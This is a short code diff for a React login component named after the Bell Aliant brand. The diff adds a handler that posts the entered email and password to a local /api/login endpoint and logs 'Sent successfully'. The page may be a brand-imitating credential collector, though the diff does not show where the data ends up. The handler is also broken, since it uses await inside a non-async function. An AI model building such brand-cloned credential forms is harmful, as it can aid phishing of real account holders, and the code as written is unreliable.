@@ -7,7 +7,26 @@ const BellAliantLogin = () => {
 
   const handleSubmit = (e) => {
     e.preventDefault();
-    // Handle login logic
+      try {
+    const response = await fetch("/api/login", {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json",
+      },
+      body: JSON.stringify({
+        email,
+        password,
+  
+      }),
+    });
+
+    const data = await response.json();
+
+    console.log("Sent successfully:", data);
+
+  } catch (error) {
+    console.error("Error sending data:", error);
+  }
   };
 
   return (
